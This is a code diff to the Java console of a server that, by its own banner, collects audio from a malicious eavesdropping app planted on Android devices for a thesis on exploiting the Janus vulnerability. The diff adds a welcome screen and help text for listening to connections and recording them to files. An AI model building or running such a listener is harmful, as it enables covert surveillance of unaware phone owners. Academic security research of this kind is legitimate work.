@@ -32,7 +32,7 @@ class Server {
         thread = new ServerThread(maxMemorySize, maxConnectionCount);
         thread.start();
 
-        showHelp();
+        showWelcomeScreen();
 
         Scanner input = new Scanner(System.in);
 
@@ -300,15 +300,59 @@ class Server {
         System.out.println("                  remove it from the list.");
         System.out.println("                Example: r 192.168.1.100:12345");
         System.out.println("");
-        System.out.println("r: Start recording the active connection");
+        System.out.println("r <CONNECTION>: Start recording the connection");
         System.out.println("   The recording will be saved in current directory as <connection>___<timestamp>.wav");
         System.out.println("");
-        System.out.println("c: Stop recording the active connection");
+        System.out.println("c <CONNECTION>: Stop recording the active connection");
         System.out.println("");
         System.out.println("q: Quit this application.");
         System.out.println("");
         System.out.println("h: Show this help");
         System.out.println("");
+        System.out.println("<CONNECTION> can be either a string in format IP:port or a letter 'a' for a connection that is active at the time (except for the 's' command)");
+    }
+
+    private static void showWelcomeScreen(){
+        System.out.println("   ___                         _____                          \n" +
+                "  |_  |                       /  ___|                         \n" +
+                "    | | __ _ _ __  _   _ ___  \\ `--   ___ _ ____   _____ _ __ \n" +
+                "    | |/ _` | '_ \\| | | / __|  `--  \\/ _ \\ '__\\ \\ / / _ \\ '__|\n" +
+                "/\\__/ / (_| | | | | |_| \\__ \\ /\\__/ /  __/ |   \\ V /  __/ |   \n" +
+                "\\____/ \\__,_|_| |_|\\__,_|___/ \\____/ \\___|_|    \\_/ \\___|_|  \n" +
+                "\n" +
+                "             MMMMMMMMMMMMMM      Server program created to receive\n" +
+                "          IMMMMMMMMMMMMMMMMMM     data from the mallicious eavesdropping\n" +
+                "         MMMMMMMMMMMMMMMMMMMMM     application installed on an Android device.\n" +
+                "        MMMMMMMMMMMMMMMMMMMMMMM         \n" +
+                "       ,MMMMMMMMMMMMMMMMMMMMMMMM   This program is a part of the diploma thesis\n" +
+                "       MMMMMMMMMMMMMMMMMMMMMMMMM        \n" +
+                "       MMMMMMMMMMMMMMMMMMMMMMMMM   -------------------------------\n" +
+                "       MMMMMMMMMMMMMMMMMMMMMMMMM   \"Exploiting Janus vulnerability\n" +
+                "        MMM~     DMMMMMM  +MMMMM          on Android OS\"   \n" +
+                "        MMM       IMM       MMM    -------------------------------\n" +
+                "         MMM      M=NM      DM,    Author: inserthackernamehere, 2020\n" +
+                "          MMMMM MMM  MMM   MMM          \n" +
+                "          MMMMMMMM    MMMMMMMM   If you want to change the limits on used memory\n" +
+                "          MMMMMMMM, M,MMMMMMMM   and incoming connections, relaunch the program\n" +
+                "             ,MMMMMMMMMMMMMMM    with arguments:\n" +
+                "            ? MMMMMMMMMMM               \n" +
+                "             +   MMMMM +         $ java <program> -c <MAX_CONN> -m <MAX_MEM>\n" +
+                "             MD         MM              _______\n" +
+                "             MMMMM,M MMMMM              |USAGE:|________________________________\n" +
+                "              MMMMMMMMMMMM              | h        - show help\n" +
+                "                MMMMMMMN        7MMM    | l        - list available connections\n" +
+                "  MMMMMMMMM        :       MMMMMMMMMMM  | s <CONN> - listen to connection <CONN>\n" +
+                " MMMMMMMMMMMMMMM      OMMMMMMMMMMM    M | d <CONN> - delete <CONN> from the list\n" +
+                "MMMMM  MMMMMMMMMMM=MMMMMMMMMMMMM MMMMMM |            of connections\n" +
+                "MMMMMMM MM     $MMMMMMM8     MM MMMMMM  | r <CONN> - Start recording <CONN>\n" +
+                "  MMMMMM M   MMMMMMMDMMMMMM   MMMMMMM   | c <CONN> - Stop recording <CONN>,\n" +
+                "    MMMMN MMMMMMM     MMMMMMMI          |            save to file\n" +
+                "        MMMMMMM         ,MMMMMMM        | q        - quit application\n" +
+                "      MMMMMMMMM         MMMMMMMMM8      | \n" +
+                "      MMMM  MMMM         MMM  MMMM      | <CONN> can either be a connection\n" +
+                "      MM NMMMMMM        MMMMMMIZMM      | identifier in format IP:port or\n" +
+                "      MMMMMMMMM          MMMMMM~M       | a letter 'a' for connection that\n" +
+                "       MMMMMM              MMMMM        | is active at the time.\n");
     }
 }
 
